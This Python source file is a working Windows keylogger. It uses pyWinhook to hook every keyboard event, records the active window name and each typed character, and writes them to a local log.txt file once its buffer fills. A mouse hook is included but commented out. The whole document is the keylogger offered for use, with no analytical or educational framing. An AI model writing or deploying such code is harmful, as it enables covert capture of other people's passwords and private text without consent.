import pythoncom
import pyWinhook as ph


class keylogger:

    def __init__(self):
        self.st = ""
        try:
            self.f = open('log.txt', 'a')
            self.f.close()
        except:
            self.f = open('log.txt', 'w')
            self.f.close()

#    def OnMouseEvent(self, event):
#        print('MessageName:', event.MessageName)
#        print('Message:', event.Message)
#        print('Time:', event.Time)
#        print('Window:', event.Window)
#        print('WindowName:', event.WindowName)
#        print('Position:', event.Position)
#        print('Wheel:', event.Wheel)
#        print('Injected:', event.Injected)
#        print('---')
#        return True

    def OnKeyboardEvent(self, event):
        #print('MessageName:', event.MessageName)
        #print('Message:', event.Message)
        #print('Time:', event.Time)
        #print('Window:', event.Window)
        #print('WindowName:', event.WindowName)
        #print('Ascii:',  event.Ascii, chr(event.Ascii))
        #print('Key:',  event.Key)
        #print('KeyID:',  event.KeyID)
        #print('ScanCode:',  event.ScanCode)
        #print('Extended:',  event.Extended)
        #print('Injected:',  event.Injected)
        #print('Alt',  event.Alt)
        #print('Transition',  event.Transition)
        #print('---')
        self.st += '\n\n'
        self.st += '========'
        self.st += '\n'
        self.st+='WindowName:' + str(event.WindowName)
        self.st += '\n'
        self.st+='Key: ' + str(chr(event.Ascii))
        self.st += '\n'
        self.st += '========'
        self.st += '\n\n'
        if len(self.st) > 100:
            f = open('log.txt', 'a')
            f.write(self.st)
            f.close()
            self.st = ""
        return True


keylogger = keylogger()
# create a hook manager
hm = ph.HookManager()
# watch for all mouse events
# hm.MouseAll = keylogger.OnMouseEvent
# set the hook
# hm.HookMouse()

# watch for all keyboard events
hm.KeyDown = keylogger.OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
